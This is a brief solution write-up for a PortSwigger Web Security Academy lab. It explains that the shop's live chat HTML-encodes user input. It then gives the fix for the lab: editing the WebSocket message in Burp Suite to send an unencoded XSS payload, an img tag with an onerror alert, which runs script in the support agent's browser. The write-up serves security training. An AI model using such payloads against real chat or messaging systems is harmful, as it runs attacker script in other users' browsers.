# [Lab: Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

## Lab

This online shop has a live chat feature implemented using WebSockets.

Chat messages that you submit are viewed by a support agent in real time.

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

## Analysis

when sending payload in normal way, special characters will be html encode:

```html
<script>
```

it will be encoded as:

```json
{"message":"&lt;script&gt;"}
```

## Solutions

Manipulating WebSocket messages using burpsuite:

```json
{"message":"<img src=1 onerror='alert()'>"}
```
